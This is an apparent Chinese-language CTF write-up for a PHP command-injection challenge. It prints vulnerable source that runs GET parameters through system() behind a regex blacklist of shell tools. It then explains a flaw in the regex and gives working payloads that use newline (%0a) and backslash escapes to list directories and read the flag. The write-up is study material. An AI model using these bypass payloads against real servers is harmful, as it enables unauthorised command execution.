# bypass
## 考察知识点
### 1.//在php中转义成/，/在正则表达式中用来转义
### 2.linux中命令的绕过

# 源码如下：
```
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
// try bypass it
if (preg_match("/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
//    如果含有非法字符，a=null
    $a = "";
//将a用双引号包起来
$a ='"' . $a . '"';
//|\\|\n|=|\|\n|
if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $b))
    $b = "";
$b = '"' . $b . '"';

//
$cmd = "file $a $b";
str_replace(" ","","$cmd");
system($cmd);
?>
```

```
a中的
|\\|\`|\*|=||`|\*|=(|`)*)
b中的
|\\|\n|=||\n|=(|\n)
为了看起来方便将||替换为（）
```

#### 所以漏洞点出现，原本a要过滤的\，`,*变成了过滤|`和|*
#### b要过滤的\和\n变成了|\n
#### 因为这个小漏洞此时a和b都可以用\了

### 此处的\可以用来绕过正则过滤
l\s可以列出目录

参考该文章：https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/

可以使用%0a来绕过。

![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/unctf/images/E9ED7DE3ED03436794AD41780D2FCD0Eweb1_bypass.png)

```
构造payload:?a=\&b=%0al\s%0a
```
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/unctf/images/6F10B6728F774EE0A31B477CABF2BFFFweb1_bypass2.png)

flag文件不在当前目录下，所以查询其他目录
```
find var/www/html
payload:?a=\&b=%0afin\d%20/var/www/html/%0a
```
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/unctf/images/3C5E331F105843878BE0A465C18DF0E3web1_bypass3.png)

所以此时读取flag文件即可
```
payload:?a=\&b=%0aca\t%20/var/???/html/.F1jh_/h3R3_1S_your_F1A9.txt%0a
```
![image](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/unctf/images/39C079542A7A4690956243C14F7B2C87web1_bypass4.png)


# //TODO 不太明白知识点%0a和www为啥要用？？？
双引号将命令变成了字符串此处采用反引号绕过，但是反引号被过滤了 所以采用%0a